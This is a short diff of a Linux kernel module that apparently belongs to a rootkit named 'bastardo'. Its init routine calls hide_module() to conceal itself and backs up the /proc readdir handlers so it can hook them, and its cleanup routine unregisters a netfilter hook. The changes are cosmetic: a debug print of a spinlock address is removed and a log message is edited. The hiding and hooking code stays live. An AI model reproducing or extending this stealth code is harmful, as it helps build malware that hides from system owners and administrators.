@@ -53,11 +53,9 @@ int init_module ()
 
 	// Safe pointer to us!
 	hidemod_setmodule(&__this_module);
-	// Hide the module.
+
+    // Hide the module.
 	hide_module();
-
-	printk("Address of proc_dir_spinlock: %p\n", _proc_dir_spinlock);
-
 	
 	// Backup previous handlers.
 	proc_original_file_operations.readdir = proc_root.proc_fops->readdir;
@@ -77,7 +75,7 @@ int init_module ()
 /* Cleanup routine */
 void cleanup_module ()
 {
-	printk("Removing module bastardo..");
+	printk("Removing module bastardo.");
 
 	nf_unregister_hook (&nfho);
 
